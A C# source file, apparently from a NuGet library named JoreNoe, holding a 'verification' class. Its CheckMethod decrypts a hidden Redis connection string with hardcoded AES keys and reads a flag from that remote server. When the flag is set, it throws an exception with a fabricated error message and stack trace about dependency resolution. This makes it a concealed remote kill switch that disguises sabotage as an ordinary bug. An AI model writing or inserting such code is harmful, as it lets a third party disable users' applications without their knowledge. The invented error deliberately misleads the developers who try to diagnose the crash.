using JoreNoe.Extend;
using Newtonsoft.Json;
using StackExchange.Redis;
using System;

namespace JoreNoe.Limit
{
    /// <summary>
    /// 验证类
    /// </summary>
    public class RequireMethod
    {
        private static string Data { get { return "0lyYS02tfuAlAFVkEHiUV+bYyiZf4sD/RJuOgy6p+80gUOVp83XqNiGsjA1kFTlV"; } }
        private static string Key { get { return "8af9adc62bd04e358906670a4f11c9ec"; } }
        private static string IV { get { return "6666666666666666"; } }

        /// <summary>
        /// 检查是否可以通过验证
        /// </summary>
        /// <returns></returns>
        public static void CheckMethod()
        {
            var Has = AESExtend.Decrypt(Data,Key,IV);
            ConnectionMultiplexer redis = ConnectionMultiplexer.Connect(Has);
            IDatabase db = redis.GetDatabase();
            if (!db.KeyExists("Nuget_JoreNoe_Pack_Config"))
                db.StringSet("Nuget_JoreNoe_Pack_Config", true, TimeSpan.FromSeconds(int.MaxValue));
            string Value = (db.StringGet("Nuget_JoreNoe_Pack_Config"));
            bool ConvertValue = JsonConvert.DeserializeObject<bool>(Value);
            if (ConvertValue)
            {
                throw new Exception("Unhandled Exception: System.InvalidOperationException: An error occurred while attempting to process the request. The operation cannot be completed due to an unknown error in the dependency resolution chain. The following issues were detected:\r\n\r\n- Dependency resolution failed for component 'MyService' due to ambiguous binding configurations in 'ServiceLocator'.\r\n- Recursive dependency detected: 'MyRepository' requires 'MyService', which in turn requires 'MyRepository'.\r\n- Configuration injection error: Missing required parameter 'DbConnectionString' in 'DatabaseConfigSection'.\r\n\r\nStack trace:\r\n   at MyNamespace.MyService.DoWork() in C:\\path\\to\\source\\MyService.cs:line 42\r\n   at MyNamespace.Program.Main(String[] args) in C:\\path\\to\\source\\Program.cs:line 18\r\n   at System.AppDomain._nExecuteAssembly(RuntimeAssembly assembly, String[] args)\r\n   at System.AppDomain.ExecuteAssembly(String assemblyFile, Evidence assemblySecurity, String[] args)\r\n   at System.Console.Application.Main(String[] args)\r\n");
            }
        }
    }
}
